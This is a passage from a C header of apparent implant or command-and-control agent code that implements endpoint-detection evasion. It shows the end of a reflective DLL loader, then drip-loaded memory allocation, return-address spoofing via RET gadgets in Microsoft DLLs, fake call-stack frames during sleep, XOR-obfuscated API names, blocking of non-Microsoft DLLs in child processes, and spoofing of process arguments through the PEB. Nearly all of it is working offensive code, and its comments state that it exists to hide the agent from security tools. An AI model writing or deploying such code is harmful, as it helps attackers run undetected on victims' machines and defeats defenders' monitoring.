        DllMain_t entry = (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }

    return (LPVOID)base;
}

#else /* ENABLE_UDRL == 0 */
static LPVOID udrl_map_dll(BYTE *rawDll, SIZE_T dllSize) {
    (void)rawDll; (void)dllSize; return NULL;
}
#endif /* ENABLE_UDRL */

/* ================================================================== */
/* Drip-Loading  (#104)                                                 */
/*                                                                      */
/* Allocates memory in small 4 KB chunks with randomised inter-chunk   */
/* delays (50-500 ms). This defeats EDR heuristics that flag large     */
/* single VirtualAlloc calls followed by immediate writes.             */
/* After all pages are committed, the final protection is applied.     */
/* ================================================================== */

#ifndef ENABLE_DRIP_LOAD
#define ENABLE_DRIP_LOAD 1
#endif

#if ENABLE_DRIP_LOAD

static LPVOID drip_alloc(SIZE_T totalSize, DWORD protect) {
    if (totalSize == 0) return NULL;

    SIZE_T pageSize  = 0x1000;
    SIZE_T aligned   = (totalSize + pageSize - 1) & ~(pageSize - 1);
    SIZE_T numPages  = aligned / pageSize;

    /* Reserve the full region up front so pages are contiguous */
    BYTE *region = (BYTE *)VirtualAlloc(NULL, aligned, MEM_RESERVE, PAGE_NOACCESS);
    if (!region) return NULL;

    DWORD seed = GetTickCount() ^ GetCurrentProcessId();

    for (SIZE_T i = 0; i < numPages; i++) {
        LPVOID page = VirtualAlloc(region + i * pageSize, pageSize,
                                   MEM_COMMIT, PAGE_READWRITE);
        if (!page) {
            VirtualFree(region, 0, MEM_RELEASE);
            return NULL;
        }

        /* Jittered delay: 50 + (rand % 451) => [50, 500] ms */
        seed ^= seed << 13; seed ^= seed >> 17; seed ^= seed << 5;
        DWORD delay = 50 + (seed % 451);
        Sleep(delay);
    }

    /* Apply the requested final protection */
    if (protect != PAGE_READWRITE) {
        DWORD old;
        VirtualProtect(region, aligned, protect, &old);
    }

    return (LPVOID)region;
}

#else /* ENABLE_DRIP_LOAD == 0 */
static LPVOID drip_alloc(SIZE_T totalSize, DWORD protect) {
    (void)totalSize; (void)protect; return NULL;
}
#endif /* ENABLE_DRIP_LOAD */

/* ================================================================== */
/* Return Address Spoofing  (#105)  —  x64 only                        */
/*                                                                      */
/* Replaces the real return address on the stack with a pointer to a   */
/* RET (0xC3) gadget inside a legitimate Microsoft DLL. EDR call-stack */
/* walkers see only Microsoft frames, hiding the agent's code.         */
/*                                                                      */
/* find_ret_gadget() locates a 0xC3 byte in the .text section of the  */
/* given module. spoof_call() is a GCC inline-asm trampoline that      */
/* swaps the return address, calls the target, and restores control.   */
/* ================================================================== */

#ifndef ENABLE_RET_ADDR_SPOOF
#define ENABLE_RET_ADDR_SPOOF 1
#endif

#if ENABLE_RET_ADDR_SPOOF

#if defined(__x86_64__) || defined(_M_X64)

static void *find_ret_gadget(HMODULE hMod) {
    if (!hMod) return NULL;

    BYTE *img = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE *start = img + sec[i].VirtualAddress;
            SIZE_T len  = sec[i].Misc.VirtualSize;
            /* Skip first 16 bytes to avoid hitting the section entry */
            for (SIZE_T j = 16; j < len; j++) {
                if (start[j] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

/*
 * Trampoline: call `func(arg1)` while the return address visible on
 * the stack points to `gadget` (a RET inside a signed DLL).
 *
 * Microsoft x64 ABI: first arg in RCX. We pass func in RDI, arg1 in
 * RSI, gadget in RDX (mapped from the C call). GCC inline asm clobbers
 * are declared so the compiler knows what we touch.
 */
static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
    ULONG_PTR ret_val;
    __asm__ __volatile__ (
        /* Save the real return address we need to get back to */
        "lea   1f(%%rip), %%rax    \n\t"  /* rax = real continuation addr */
        "push  %%rax               \n\t"  /* save it below the fake frame */
        "push  %%rbp               \n\t"  /* save frame pointer           */
        "mov   %%rsp, %%rbp        \n\t"

        /* Build a fake frame: when `func` returns, it RETs into gadget,
           and gadget (a bare 0xC3) RETs into our saved real address.    */
        "push  %%rdx               \n\t"  /* gadget addr = fake retaddr  */
        "mov   %%rsi, %%rcx        \n\t"  /* arg1 -> RCX (MS ABI)       */
        "sub   $0x20, %%rsp        \n\t"  /* shadow space                */
        "call  *%%rdi              \n\t"  /* call func                   */
        "add   $0x20, %%rsp        \n\t"
        "add   $0x8,  %%rsp        \n\t"  /* pop the gadget slot         */

        "mov   %%rbp, %%rsp        \n\t"  /* restore stack               */
        "pop   %%rbp               \n\t"
        "add   $0x8,  %%rsp        \n\t"  /* pop saved real ret addr     */
        "1:                        \n\t"
        : "=a" (ret_val)
        : "D" (func), "S" (arg1), "d" (gadget)
        : "rcx", "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return ret_val;
}

#else
/* x86 / other arch: stubs */
static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
    (void)gadget;
    typedef ULONG_PTR (*fn_t)(void *);
    return ((fn_t)func)(arg1);
}
#endif /* x86_64 */

#else /* ENABLE_RET_ADDR_SPOOF == 0 */
static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
    (void)gadget;
    typedef ULONG_PTR (*fn_t)(void *);
    return ((fn_t)func)(arg1);
}
#endif /* ENABLE_RET_ADDR_SPOOF */

/* ================================================================== */
/* Synthetic Stack Frames  (#106)                                       */
/*                                                                      */
/* Fabricates a plausible call-stack chain during sleep so that EDR    */
/* thread-stack scanners see only legitimate Windows frames.           */
/*                                                                      */
/* Before sleeping: synth_frames_push() saves the real RSP/RBP and    */
/* builds a fake frame chain through RtlUserThreadStart →             */
/* BaseThreadInitThunk. After waking: synth_frames_pop() restores the */
/* original stack pointers.                                             */
/* ================================================================== */

#ifndef ENABLE_SYNTHETIC_FRAMES
#define ENABLE_SYNTHETIC_FRAMES 1
#endif

#if ENABLE_SYNTHETIC_FRAMES

#if defined(__x86_64__) || defined(_M_X64)

static struct {
    void *rtl_user_thread_start;
    void *base_thread_init_thunk;
    ULONG_PTR saved_rsp;
    ULONG_PTR saved_rbp;
    BYTE frame_buf[256];
} g_synth;

static void synth_frames_init(void) {
    char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
    HMODULE hNtdll = GetModuleHandleA(sNt);
    SecureZeroMemory(sNt, sizeof(sNt));

    char sK32[] = {0x20,0x2E,0x39,0x25,0x2E,0x27,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sK32[i]; i++) sK32[i] ^= EVASION_XOR_KEY;
    HMODULE hKernel = GetModuleHandleA(sK32);
    SecureZeroMemory(sK32, sizeof(sK32));

    if (hNtdll) {
        /* "RtlUserThreadStart" XOR 0x4B */
        char sRts[] = {0x19,0x3F,0x27,0x1E,0x38,0x2E,0x39,0x1F,0x23,
                       0x39,0x2E,0x2A,0x2F,0x18,0x3F,0x2A,0x39,0x3F,0x00};
        for (int i = 0; sRts[i]; i++) sRts[i] ^= EVASION_XOR_KEY;
        g_synth.rtl_user_thread_start =
            (void *)GetProcAddress(hNtdll, sRts);
        SecureZeroMemory(sRts, sizeof(sRts));
    }
    if (hKernel) {
        /* "BaseThreadInitThunk" XOR 0x4B */
        char sBti[] = {0x09,0x2A,0x38,0x2E,0x1F,0x23,0x39,0x2E,0x2A,0x2F,
                       0x02,0x25,0x22,0x3F,0x1F,0x23,0x3E,0x25,0x20,0x00};
        for (int i = 0; sBti[i]; i++) sBti[i] ^= EVASION_XOR_KEY;
        g_synth.base_thread_init_thunk =
            (void *)GetProcAddress(hKernel, sBti);
        SecureZeroMemory(sBti, sizeof(sBti));
    }
}

static void synth_frames_push(void) {
    /* Save real stack state */
    __asm__ __volatile__ (
        "mov %%rsp, %0 \n\t"
        "mov %%rbp, %1 \n\t"
        : "=m" (g_synth.saved_rsp), "=m" (g_synth.saved_rbp)
        :
        : "memory"
    );

    /*
     * Build a fake RBP chain in frame_buf:
     *   frame_buf[0..7]   = fake prev-RBP (points to frame_buf+16)
     *   frame_buf[8..15]  = fake return addr -> BaseThreadInitThunk
     *   frame_buf[16..23] = NULL prev-RBP (end of chain)
     *   frame_buf[24..31] = fake return addr -> RtlUserThreadStart
     */
    ULONG_PTR *fb = (ULONG_PTR *)g_synth.frame_buf;
    fb[0] = (ULONG_PTR)&fb[2];                                  /* prev RBP -> next frame */
    fb[1] = (ULONG_PTR)g_synth.base_thread_init_thunk;          /* fake ret addr          */
    fb[2] = 0;                                                   /* chain terminator       */
    fb[3] = (ULONG_PTR)g_synth.rtl_user_thread_start;           /* final fake ret addr    */

    /* Point RBP into our fake chain */
    __asm__ __volatile__ (
        "mov %0, %%rbp \n\t"
        :
        : "r" ((ULONG_PTR)&fb[0])
        : "memory"
    );
}

static void synth_frames_pop(void) {
    __asm__ __volatile__ (
        "mov %0, %%rsp \n\t"
        "mov %1, %%rbp \n\t"
        :
        : "m" (g_synth.saved_rsp), "m" (g_synth.saved_rbp)
        : "memory"
    );
}

#else
/* x86 / other arch: stubs */
static void synth_frames_init(void) {}
static void synth_frames_push(void) {}
static void synth_frames_pop(void) {}
#endif /* x86_64 */

#else /* ENABLE_SYNTHETIC_FRAMES == 0 */
static void synth_frames_init(void) {}
static void synth_frames_push(void) {}
static void synth_frames_pop(void) {}
#endif /* ENABLE_SYNTHETIC_FRAMES */

/* ================================================================== */
/* BlockDLLs  (#110)                                                    */
/*                                                                      */
/* Creates child processes with                                        */
/* PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES     */
/* so that third-party EDR DLLs cannot inject into spawned processes.  */
/* Toggled at runtime via g_block_dlls.                                 */
/* Falls back to normal CreateProcessA if attribute setup fails.       */
/* ================================================================== */

#ifndef ENABLE_BLOCK_DLLS
#define ENABLE_BLOCK_DLLS 1
#endif

#if ENABLE_BLOCK_DLLS

static int g_block_dlls = 0;

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif

static BOOL create_process_block_dlls(const char *cmdline,
                                      HANDLE hStdOut, HANDLE hStdErr,
                                      PROCESS_INFORMATION *pi) {
    BOOL  result = FALSE;
    SIZE_T attrSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = NULL;

    /* Convert narrow cmdline to wide */
    int wlen = MultiByteToWideChar(CP_ACP, 0, cmdline, -1, NULL, 0);
    if (wlen <= 0) goto blk_fallback;
    WCHAR *wcmd = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(WCHAR));
    if (!wcmd) goto blk_fallback;
    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, wlen);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
                                                        HEAP_ZERO_MEMORY,
                                                        attrSize);
    if (!attrList) { HeapFree(GetProcessHeap(), 0, wcmd); goto blk_fallback; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        HeapFree(GetProcessHeap(), 0, attrList);
        HeapFree(GetProcessHeap(), 0, wcmd);
        goto blk_fallback;
    }

    DWORD64 policy = 0x100000000000ULL; /* BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON */
    if (!UpdateProcThreadAttribute(attrList, 0,
                                   PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                                   &policy, sizeof(policy), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        HeapFree(GetProcessHeap(), 0, wcmd);
        goto blk_fallback;
    }

    STARTUPINFOEXW siex;
    ZeroMemory(&siex, sizeof(siex));
    siex.StartupInfo.cb          = sizeof(siex);
    siex.StartupInfo.dwFlags     = STARTF_USESTDHANDLES;
    siex.StartupInfo.hStdOutput  = hStdOut;
    siex.StartupInfo.hStdError   = hStdErr;
    siex.lpAttributeList         = attrList;

    result = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                            NULL, NULL,
                            (LPSTARTUPINFOW)&siex, pi);

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    HeapFree(GetProcessHeap(), 0, wcmd);
    return result;

blk_fallback:
    {
        STARTUPINFOA si;
        ZeroMemory(&si, sizeof(si));
        si.cb          = sizeof(si);
        si.dwFlags     = STARTF_USESTDHANDLES;
        si.hStdOutput  = hStdOut;
        si.hStdError   = hStdErr;
        return CreateProcessA(NULL, (LPSTR)cmdline, NULL, NULL, TRUE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, pi);
    }
}

#else /* ENABLE_BLOCK_DLLS == 0 */
static int g_block_dlls = 0;
static BOOL create_process_block_dlls(const char *cmdline,
                                      HANDLE hStdOut, HANDLE hStdErr,
                                      PROCESS_INFORMATION *pi) {
    (void)cmdline; (void)hStdOut; (void)hStdErr; (void)pi;
    return FALSE;
}
#endif /* ENABLE_BLOCK_DLLS */

/* ================================================================== */
/* Argument Spoofing  (#111)                                            */
/*                                                                      */
/* Creates a child process with fake (benign) command-line arguments,  */
/* then overwrites the real arguments into the PEB of the suspended    */
/* process before resuming it. EDR process-creation telemetry records  */
/* only the decoy arguments.                                           */
/*                                                                      */
/* Flow:                                                                */
/*   1. CreateProcessW with decoy args + CREATE_SUSPENDED              */
/*   2. NtQueryInformationProcess → PEB address                        */
/*   3. ReadProcessMemory → ProcessParameters → CommandLine            */
/*   4. WriteProcessMemory to overwrite CommandLine.Buffer + Length     */
/*   5. ResumeThread                                                    */
/* ================================================================== */

#ifndef ENABLE_ARG_SPOOF
#define ENABLE_ARG_SPOOF 1
#endif

#if ENABLE_ARG_SPOOF

static int g_arg_spoof = 0;

typedef struct _APEX_PROCESS_BASIC_INFORMATION {
    PVOID     Reserved1;
    PVOID     PebBaseAddress;
    PVOID     Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID     Reserved3;
} APEX_PROCESS_BASIC_INFORMATION;

typedef NTSTATUS (WINAPI *pfnNtQueryInformationProcess_t)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static BOOL create_process_arg_spoof(const char *realCmd,
                                     HANDLE hStdOut, HANDLE hStdErr,
                                     PROCESS_INFORMATION *pi) {
    /* Resolve NtQueryInformationProcess from ntdll */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    char szNtQip[] = {'N','t','Q','u','e','r','y','I','n','f','o','r','m',
                      'a','t','i','o','n','P','r','o','c','e','s','s',0};
    pfnNtQueryInformationProcess_t pNtQip =
        (pfnNtQueryInformationProcess_t)GetProcAddress(hNtdll, szNtQip);
    if (!pNtQip) return FALSE;

    /* Decoy command line */
    WCHAR wFake[] = L"cmd.exe /c echo ok";

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hStdOut;
    si.hStdError   = hStdErr;

    if (!CreateProcessW(NULL, wFake, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, pi))
        return FALSE;

    /* Read PEB address from the suspended process */
    APEX_PROCESS_BASIC_INFORMATION pbi;
    ZeroMemory(&pbi, sizeof(pbi));
    ULONG retLen = 0;
    NTSTATUS st = pNtQip(pi->hProcess, 0 /* ProcessBasicInformation */,
                         &pbi, sizeof(pbi), &retLen);
    if (!NT_SUCCESS(st)) goto spoof_fail;

    /* Read ProcessParameters pointer from PEB (offset 0x20 on x64) */
    PVOID pebAddr = pbi.PebBaseAddress;
    PVOID procParams = NULL;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi->hProcess,
                           (BYTE *)pebAddr + 0x20,
                           &procParams, sizeof(procParams), &bytesRead))
        goto spoof_fail;

    /* Convert real args to wide */
    int wRealLen = MultiByteToWideChar(CP_ACP, 0, realCmd, -1, NULL, 0);
    if (wRealLen <= 0) goto spoof_fail;
    WCHAR *wReal = (WCHAR *)HeapAlloc(GetProcessHeap(), 0,
                                       wRealLen * sizeof(WCHAR));
    if (!wReal) goto spoof_fail;
    MultiByteToWideChar(CP_ACP, 0, realCmd, -1, wReal, wRealLen);

    /*
     * RTL_USER_PROCESS_PARAMETERS layout (x64):
     *   offset 0x70: CommandLine (UNICODE_STRING)
     *     .Length        (USHORT) at +0x70
     *     .MaximumLength (USHORT) at +0x72
     *     .Buffer        (PWSTR)  at +0x78
     */
    PVOID cmdLineBufPtr = NULL;
    if (!ReadProcessMemory(pi->hProcess,
                           (BYTE *)procParams + 0x78,
                           &cmdLineBufPtr, sizeof(cmdLineBufPtr), &bytesRead))
        goto spoof_fail_free;

    /* Overwrite the command-line buffer in the target process */
    SIZE_T realByteLen = (SIZE_T)(wRealLen - 1) * sizeof(WCHAR);
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi->hProcess, cmdLineBufPtr,
                            wReal, realByteLen + sizeof(WCHAR), &written))
        goto spoof_fail_free;

    /* Update CommandLine.Length */
    USHORT newLength = (USHORT)realByteLen;
    WriteProcessMemory(pi->hProcess,
                       (BYTE *)procParams + 0x70,
                       &newLength, sizeof(newLength), &written);

    HeapFree(GetProcessHeap(), 0, wReal);
    ResumeThread(pi->hThread);
    return TRUE;

spoof_fail_free:
    HeapFree(GetProcessHeap(), 0, wReal);
spoof_fail:
    TerminateProcess(pi->hProcess, 1);
    CloseHandle(pi->hProcess);
    CloseHandle(pi->hThread);
    pi->hProcess = NULL;
    pi->hThread  = NULL;
    return FALSE;
}

#else /* ENABLE_ARG_SPOOF == 0 */
static int g_arg_spoof = 0;
static BOOL create_process_arg_spoof(const char *realCmd,
                                     HANDLE hStdOut, HANDLE hStdErr,
                                     PROCESS_INFORMATION *pi) {
    (void)realCmd; (void)hStdOut; (void)hStdErr; (void)pi;
    return FALSE;
}
#endif /* ENABLE_ARG_SPOOF */

#endif /* APEX_EVASION_H */
